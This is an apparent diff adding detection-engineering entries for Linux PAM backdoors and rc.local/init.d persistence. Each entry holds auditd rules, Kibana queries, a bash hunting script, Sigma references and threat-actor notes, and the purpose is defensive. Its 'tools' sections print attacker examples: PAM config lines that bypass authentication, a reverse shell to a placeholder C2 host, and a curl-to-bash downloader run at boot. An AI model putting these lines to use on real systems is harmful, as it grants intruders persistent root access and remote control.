+    /etc/pam.d/sshd                        - SSH authentication
+    /etc/pam.d/sudo                        - sudo authentication
+    /etc/pam.d/su                          - su command
+    /etc/pam.d/login                       - console login
+    /etc/pam.d/common-auth                 - shared auth stack (Debian)
+    /etc/pam.d/system-auth                 - shared auth stack (RHEL)
+
+Highest-value backdoor targets:
+  pam_unix.so     - password validation (most common backdoor)
+  pam_permit.so   - always returns success (config abuse)
+  common-auth     - if modified, affects ALL services on Debian
+  system-auth     - if modified, affects ALL services on RHEL
+
+PAM stack directives to watch for:
+  auth sufficient pam_permit.so   - bypass all auth
+  auth sufficient /tmp/evil.so    - load attacker module
+  auth required pam_unix.so nullok  - allow empty passwords`,
+        tools: `Known PAM backdoor implementations and tools:
+
+linux-pam-backdoor (zephrax):
+  - Patches pam_unix_auth.c to accept a magic password
+  - Compiled into pam_unix.so replacement
+  - github.com/zephrax/linux-pam-backdoor
+
+Ebury rootkit (RU-nexus):
+  - Most sophisticated PAM backdoor in the wild
+  - Harvests SSH credentials as plain text via PAM
+  - Affected millions of OpenSSH servers globally
+  - ESET Windigo research (multiple papers 2014-2024)
+
+Skidmap (CN-linked):
+  - Uses PAM manipulation alongside LKM rootkit
+  - pam_unix.so backdoor plus credential harvesting
+
+Medusa rootkit:
+  - Open-source; includes PAM credential harvesting module
+  - Used to capture passwords during authentication
+
+Azazel:
+  - LD_PRELOAD based; hooks PAM functions to capture creds
+
+"Plague" PAM backdoor:
+  - Config-only backdoor; adds module reference to blend in
+  - No binary modification; just pam.d config change
+
+Manual PAM config bypass:
+  # Add to /etc/pam.d/sshd:
+  auth sufficient pam_permit.so
+  # (placed before pam_unix.so; bypasses password check)
+
+  # Or load a custom module:
+  auth sufficient /tmp/pam_evil.so
+
+  # sudo bypass example:
+  auth sufficient pam_permit.so
+  (place in /etc/pam.d/sudo)`,
+        ossdetect: `Sigma rules:
+- file_event_lnx_pam_config_modification.yml
+- file_event_lnx_pam_module_modification.yml
+- proc_creation_lnx_pam_module_compile.yml
+
+Elastic (elastic.co security labs):
+  'Approaching the Summit on Persistence'
+  - PAM hunting rule: Persistence via Pluggable Authentication Modules
+  - Covers /etc/pam.d/ and /lib/security/ modifications
+
+AIDE / Tripwire:
+  Configure to monitor ALL PAM modules with sha256:
+  /usr/lib/x86_64-linux-gnu/security p+sha256+i+n+u+g
+  /etc/pam.d p+sha256+i+n+u+g
+  Run aide --check after each change window
+
+Auditd + ausearch:
+  ausearch -k pam_config_write --start today
+  ausearch -k pam_module_write --start today
+
+Package verify (most reliable check):
+  dpkg --verify libpam-modules libpam-runtime
+  rpm -V pam
+  Any 'M' or '5' flag on a PAM .so file = CRITICAL ALERT
+
+Atomic Red Team:
+  T1556.003 Test #1 (PAM config modification)
+  T1556.003 Test #2 (custom module compile + load)
+
+Wazuh:
+  Syscheck configured on /etc/pam.d and /lib/security
+  Triggers file integrity alert on any change`,
+        notes: "PAM backdoors are among the most dangerous Linux persistence mechanisms because they sit directly in the authentication path for every service on the host - SSH, sudo, su, login, and any PAM-aware application. A backdoored pam_unix.so with a master password gives an attacker authentication bypass that survives password resets, account deletions, and service restarts. What makes this especially insidious is that the authentication still succeeds for legitimate users - the backdoor adds an additional credential that works alongside normal credentials, so defenders see no authentication failures and no anomalous access patterns. The credential harvesting variant is equally dangerous: since PAM receives plaintext passwords before hashing, a malicious PAM module can log every password entered on the system, capturing admin credentials for lateral movement. Primary detection approach: file integrity monitoring on PAM module directories plus package manager verification after any suspicious system change. If dpkg --verify libpam-modules or rpm -V pam returns a '5' flag (checksum mismatch) on pam_unix.so, treat as critical compromise until proven otherwise. For the config-only variant (adding pam_permit.so to /etc/pam.d/sudo or common-auth), the file integrity alert on /etc/pam.d/ is your primary signal.",
+        apt: [
+          { cls: "apt-ru", name: "Ebury / Windigo", note: "Most sophisticated PAM backdoor documented in the wild; targeted hosting providers globally for over a decade; harvests SSH credentials as plaintext via PAM hooks." },
+          { cls: "apt-cn", name: "Skidmap", note: "Linux cryptominer with PAM manipulation component alongside LKM rootkit; modifies pam_unix.so to accept a master password while maintaining normal authentication." },
+          { cls: "apt-mul", name: "linux-pam-backdoor", note: "Openly available PoC tool (github.com/zephrax) that patches pam_unix.so; used by financially motivated actors with Linux server access." },
+          { cls: "apt-mul", name: "Advanced operators", note: "PAM backdoors document in campaigns targeting cloud server infrastructure; used for long-term credential access and persistence simultaneously." }
+        ],
+        cite: "MITRE ATT&CK T1556.003"
+      }
+    ]
+  },
+
+  {
+    id: "T1037.004",
+    name: "Boot or Logon Initialization Scripts: RC Scripts",
+    desc: "Persistence via /etc/rc.local, SysV init.d scripts, and systemd-rc-local-generator compatibility shim — scripts executed as root at system boot with minimal audit trail on many distros",
+    rows: [
+      {
+        sub: "T1037.004 - rc.local and SysV Init Script Persistence",
+        os: "linux",
+        indicator: "Modification of /etc/rc.local, /etc/rc.d/rc.local, addition of new init.d scripts in /etc/init.d/, or corresponding symlinks created in /etc/rc*.d/ for autostart",
+        sysmon: `# Auditd rules for RC script persistence
+
+# rc.local (most common vector)
+-w /etc/rc.local -p wa -k rclocal_write
+-w /etc/rc.d/rc.local -p wa -k rclocal_write  # RHEL path
+
+# SysV init.d script directory
+-w /etc/init.d -p wa -k initd_write
+
+# rcN.d symlink directories (update-rc.d creates these)
+-w /etc/rc0.d -p wa -k rcd_write
+-w /etc/rc1.d -p wa -k rcd_write
+-w /etc/rc2.d -p wa -k rcd_write
+-w /etc/rc3.d -p wa -k rcd_write
+-w /etc/rc4.d -p wa -k rcd_write
+-w /etc/rc5.d -p wa -k rcd_write
+-w /etc/rc6.d -p wa -k rcd_write
+-w /etc/rcS.d -p wa -k rcd_write
+
+# update-rc.d binary (registers init scripts)
+-a always,exit -F arch=b64 -S execve \
+  -F path=/usr/sbin/update-rc.d -k rclocal_write
+
+# chkconfig (RHEL equivalent)
+-a always,exit -F arch=b64 -S execve \
+  -F path=/usr/sbin/chkconfig -k rclocal_write
+
+# Sysmon for Linux EID 11:
+# TargetFilename = /etc/rc.local OR /etc/init.d/*`,
+        kibana: `// rc.local modification — high confidence persistence
+event.module: "file_integrity"
+AND file.path: (/etc/rc.local OR /etc/rc.d/rc.local)
+
+// init.d new script or modification
+event.module: "file_integrity"
+AND file.path: /etc/init.d/*
+
+// rc*.d symlinks (update-rc.d creates these for autostart)
+event.module: "file_integrity"
+AND file.path: (/etc/rc*.d/*)
+
+// Auditd keys
+event.module: "auditd"
+AND tags: ("rclocal_write" OR "initd_write" OR "rcd_write")
+
+// update-rc.d or chkconfig execution
+event.module: "auditd"
+AND tags: "rclocal_write"
+AND process.executable: (*update-rc.d OR *chkconfig)
+
+// rc.local executable bit change (attacker enables execution)
+event.module: "auditd"
+AND auditd.data.syscall: ("chmod" OR "fchmod" OR "fchmodat")
+AND auditd.data.a1: ("777" OR "755" OR "700")
+AND auditd.log.name: (*rc.local*)
+
+// Sysmon for Linux EID 1 — process spawned from rc.local context
+process.parent.executable: "/bin/sh"
+AND process.parent.args: ("/etc/rc.local")`,
+        powershell: `#!/bin/bash
+# T1037.004 - RC Scripts / Init Persistence Hunt
+
+echo "[*] === /etc/rc.local status and content ==="
+for f in /etc/rc.local /etc/rc.d/rc.local; do
+  [ -f "$f" ] || continue
+  echo "--- $f ---"
+  ls -la "$f"
+  echo "Permissions: $(stat -c '%a' "$f")"
+  echo "Content:"
+  cat "$f"
+  echo ""
+done
+
+echo ""
+echo "[*] === SysV init.d scripts (non-package) ==="
+for f in /etc/init.d/*; do
+  [ -f "$f" ] || continue
+  # Check if from package manager
+  if ! (dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null) | grep -q .; then
+    echo "[FLAG] Non-packaged init.d script: $f"
+    ls -la "$f"
+    head -20 "$f"
+    echo ""
+  fi
+done
+
+echo ""
+echo "[*] === rcN.d symlinks ==="
+for dir in /etc/rc0.d /etc/rc1.d /etc/rc2.d /etc/rc3.d \
+           /etc/rc4.d /etc/rc5.d /etc/rc6.d /etc/rcS.d; do
+  [ -d "$dir" ] || continue
+  echo "--- $dir ---"
+  ls -la "$dir" 2>/dev/null
+done
+
+echo ""
+echo "[*] === Services registered via update-rc.d / chkconfig ==="
+if command -v service &>/dev/null; then
+  service --status-all 2>/dev/null | grep "+"
+fi
+if command -v chkconfig &>/dev/null; then
+  chkconfig --list 2>/dev/null
+fi
+
+echo ""
+echo "[*] === systemd rc-local compatibility service ==="
+# Modern systemd can run rc.local via rc-local.service
+systemctl status rc-local 2>/dev/null
+systemctl is-enabled rc-local 2>/dev/null
+
+echo ""
+echo "[*] === Suspicious content in init scripts ==="
+grep -rE \
+  "(curl|wget|/tmp/|/dev/shm/|nc |ncat|bash -i|python|base64)" \
+  /etc/init.d/ /etc/rc.local /etc/rc.d/ 2>/dev/null
+
+echo ""
+echo "[*] === Recently modified init files ==="
+find /etc/init.d /etc/rc.local /etc/rc.d \
+  /etc/rc0.d /etc/rc1.d /etc/rc2.d /etc/rc3.d \
+  /etc/rc4.d /etc/rc5.d /etc/rc6.d /etc/rcS.d \
+  -mtime -7 -ls 2>/dev/null`,
+        registry: `RC script persistence locations:
+
+Primary:
+  /etc/rc.local               - Debian/Ubuntu; runs at boot as root
+  /etc/rc.d/rc.local          - RHEL/CentOS; same function
+  (must be executable: chmod +x /etc/rc.local)
+
+SysV init.d system:
+  /etc/init.d/<name>          - service script (LSB header required)
+  /etc/rc2.d/S<num><name>     - symlink for run level 2 (multi-user)
+  /etc/rc3.d/S<num><name>     - symlink for run level 3
+  /etc/rc5.d/S<num><name>     - symlink for run level 5 (GUI)
+  /etc/rcS.d/S<num><name>     - runs before numbered runlevels
+  (S = Start, K = Kill; prefix number sets execution order)
+
+Registration commands (watched):
+  update-rc.d <name> defaults  - Debian; creates rcN.d symlinks
+  chkconfig --add <name>        - RHEL; registers for autostart
+  insserv <name>                - alternate Debian registration
+
+systemd compatibility shim:
+  /lib/systemd/system/rc-local.service
+  (if enabled, systemd runs /etc/rc.local at boot via ExecStart)
+  Check: systemctl is-enabled rc-local
+
+ESXi rc.local equivalent:
+  /etc/rc.local.d/<name>.sh    - persistence on VMware ESXi
+  /etc/init.d/<name>           - ESXi init system
+
+Adversary naming patterns:
+  /etc/init.d/network-update   (spoofed system name)
+  /etc/init.d/.hidden_service  (dot-prefixed to hide in ls)
+  /etc/rc.local.bak            (trojanized "backup" copy)`,
+        tools: `APT actors and malware using RC script persistence:
+
+UNC3524 (China-nexus, Mandiant):
+  - Documented use of rc.local for persistence on Linux servers
+  - Used alongside SSH key injection for layered persistence
+  - 18+ month dwell time on email infrastructure
+
+Sandworm / GRU (RU):
+  - Industroyer2 campaign used init.d scripts on Linux hosts
+  - Targeted ICS/OT-adjacent Linux systems
+
+ESXiArgs ransomware:
+  - Used /etc/rc.local.d/ on VMware ESXi for persistence
+  - Asher Langton documented custom Python backdoor via rc.local
+
+NCSC-documented actors:
+  - Multiple state-sponsored groups documented using rc.local
+  - Favored on older/RHEL-based infrastructure
+
+Common attacker rc.local payload patterns:
+  # Append to /etc/rc.local (before 'exit 0'):
+  /tmp/.daemon &
+
+  # Single-line C2 callback:
+  nohup bash -c 'bash -i >& /dev/tcp/C2/4444 0>&1' &
+
+  # Downloader on boot:
+  curl -s http://C2/loader | bash &
+
+  # Persistent miner:
+  /usr/lib/update-notifier/miner --config /etc/.config &
+
+  # enable rc.local if it exists but isn't executable:
+  chmod +x /etc/rc.local
+
+update-rc.d / chkconfig abuse:
+  update-rc.d evil-service defaults
+  chkconfig --add evil-service; chkconfig evil-service on`,
+        ossdetect: `Sigma rules:
+- file_event_lnx_rc_local_modification.yml
+- file_event_lnx_initd_script_creation.yml
+- proc_creation_lnx_update_rcd_execution.yml
+- proc_creation_lnx_susp_rc_local_child.yml
+
+Elastic detection rules:
+- RC Script Modification
+- Potential rc.local Persistence
+- SysV Init Script Creation
+
+Atomic Red Team:
+- T1037.004 Test #1 (rc.local modification)
+- T1037.004 Test #2 (init.d script registration)
+
+PANIX:
+- ./panix.sh --rc-local
+  Tests rc.local and init.d persistence vectors
+  github.com/Aegrah/PANIX
+
+Wazuh syscheck:
+  Configure to monitor /etc/rc.local, /etc/init.d/
+  with alert on modification and new file creation
+
+Velociraptor:
+- Linux.Detection.Artifacts (includes rc.local check)
+- Linux.Sys.Services (includes SysV service enumeration)
+
+Package verify:
+  dpkg --verify sysvinit-utils (Debian)
+  rpm -V initscripts (RHEL)
+  Verify no unexpected changes to init infrastructure
+
+auditd + ausearch:
+  ausearch -k rclocal_write --start today
+  ausearch -k initd_write --start today`,
+        notes: "RC scripts are a legacy persistence mechanism that remains highly relevant because /etc/rc.local is still present and functional on most modern Linux distributions (typically bridged through the systemd rc-local.service compatibility unit). Unlike systemd services, rc.local requires no service file, no systemctl enable, and generates minimal audit artifacts if auditd isn't watching the file. On many default installations, /etc/rc.local exists but is empty or absent, making any new content immediately suspicious. The two-step detection: (1) watch for writes to /etc/rc.local and /etc/init.d/* in real time via auditd or file integrity monitoring; (2) sweep for anomalous content (especially payloads in /tmp, curl/wget, background processes with &) in any existing init scripts. SysV init.d scripts are slightly more complex because they require both the script file and rcN.d symlinks for autostart - however, the update-rc.d binary execution is a high-confidence signal, especially if invoked by a non-root user or a suspicious parent process. On ESXi, /etc/rc.local.d/*.sh is the equivalent and has been exploited by ransomware operators. Verify ESXi init scripts against VMware's published baseline or your golden image.",
+        apt: [
+          { cls: "apt-cn", name: "UNC3524", note: "China-nexus actor (Mandiant); documented rc.local persistence on Linux mail infrastructure; used alongside SSH key injection for 18+ month dwell." },
+          { cls: "apt-ru", name: "Sandworm / GRU", note: "Russian GRU-linked actor; init.d scripts used on Linux hosts adjacent to ICS infrastructure in Ukraine-targeted operations." },
+          { cls: "apt-mul", name: "ESXiArgs ransomware", note: "VMware ESXi ransomware used /etc/rc.local.d/ persistence; Asher Langton documented custom Python backdoor via this mechanism (December 2022)." },
+          { cls: "apt-mul", name: "Various Linux server actors", note: "rc.local is a favored low-noise persistence mechanism on older RHEL/CentOS server infrastructure targeted by espionage and financial actors." }
+        ],
+        cite: "MITRE ATT&CK T1037.004"
+      }
+    ]
+  }
+
 ];
